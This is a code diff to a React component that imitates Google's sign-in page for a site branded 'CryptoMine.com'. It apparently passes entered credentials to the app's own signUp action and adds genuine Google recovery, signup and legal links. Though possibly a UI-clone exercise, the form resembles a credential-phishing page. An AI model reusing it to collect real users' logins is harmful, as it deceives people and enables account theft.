@@ -1,9 +1,14 @@
 import React from "react";
 import { connect } from "react-redux";
-import { setSignUp, setErrors, setCurrentUser } from "../../redux/user/user.action";
+import {
+  setSignUp,
+  setErrors,
+  setCurrentUser,
+} from "../../redux/user/user.action";
 
 import { Button } from "@material-ui/core";
 import AccountCircleIcon from "@material-ui/icons/AccountCircle";
+import ArrowDropDownIcon from "@material-ui/icons/ArrowDropDown";
 
 import "./google.scss";
 import GoogleInput from "./GoogleInput";
@@ -26,7 +31,7 @@ function Google({ errors, signUp, setErrors, setCurrentUser }) {
     };
     signUp(user)
       .then(() => {
-        setCurrentUser(true)
+        setCurrentUser(true);
       })
       .catch((err) => {
         if (!err.email && values.next !== "2") {
@@ -91,9 +96,13 @@ function Google({ errors, signUp, setErrors, setCurrentUser }) {
                     <b style={{ color: "#1a73e8" }}>CryptoMine.com</b>
                   </span>
                 ) : (
-                  <div className="logo-and-email">
+                  <div
+                    className="logo-and-email"
+                    onClick={() => setValues({ ...values, next: "1" })}
+                  >
                     <AccountCircleIcon />
                     <span className="email">{values.email}</span>
+                    <ArrowDropDownIcon />
                   </div>
                 )}
               </div>
@@ -107,8 +116,15 @@ function Google({ errors, signUp, setErrors, setCurrentUser }) {
                     setValues={setValues}
                     errors={errors}
                   />
+
                   <div className="container-body-text">
-                    <a href="/">Forgot Email?</a>
+                    <a
+                      href="https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin"
+                      target="_blank"
+                      rel="noopener noreferrer"
+                    >
+                      {values.next === "1" ? "Forgot Email?" : ""}
+                    </a>
                   </div>
 
                   <div className="google-container-buttons">
@@ -129,7 +145,25 @@ function Google({ errors, signUp, setErrors, setCurrentUser }) {
                       </div>
                       <div className="google-button-help">
                         <Button style={{ textTransform: "none" }}>
-                          Create account
+                          {values.next === "1" ? (
+                            <a
+                              href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp"
+                              target="_blank"
+                              rel="noopener noreferrer"
+                            >
+                              {" "}
+                              Create account
+                            </a>
+                          ) : (
+                            <a
+                              href="https://accounts.google.com/signin/v2/recoveryidentifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin"
+                              target="_blank"
+                              rel="noopener noreferrer"
+                            >
+                              {" "}
+                              Forgot password?
+                            </a>
+                          )}
                         </Button>
                       </div>
                     </div>
@@ -146,6 +180,7 @@ function Google({ errors, signUp, setErrors, setCurrentUser }) {
               <a
                 href="https://support.google.com/accounts?hl=en"
                 target="_blank"
+                rel="noopener noreferrer"
               >
                 Help
               </a>
@@ -154,6 +189,7 @@ function Google({ errors, signUp, setErrors, setCurrentUser }) {
               <a
                 href="https://accounts.google.com/TOS?loc=NP&amp;hl=en&amp;privacy=true"
                 target="_blank"
+                rel="noopener noreferrer"
               >
                 Privacy
               </a>
@@ -162,6 +198,7 @@ function Google({ errors, signUp, setErrors, setCurrentUser }) {
               <a
                 href="https://accounts.google.com/TOS?loc=NP&amp;hl=en"
                 target="_blank"
+                rel="noopener noreferrer"
               >
                 Terms
               </a>
